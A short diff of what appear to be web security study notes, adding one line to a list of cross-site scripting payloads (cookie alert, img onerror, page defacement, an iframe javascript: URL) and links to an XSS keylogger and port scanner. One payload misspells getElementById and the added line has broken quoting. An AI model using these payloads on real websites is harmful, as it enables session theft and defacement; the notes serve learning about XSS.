@@ -152,6 +152,7 @@ Note: "#PCDATA" means parsable character data.
 - `<script>alert(document.cookie)</script>`
 - `<img src=x onerror=alert('XSS');>`
 - `<script>document.getByElementId("thm-title").innerHTML="I am a hacker"</script>`
+- `<iframe src="javascript:alert(`xss`)">
 - [XSS Keylogger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
 - [XSS PortScanning](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)
 
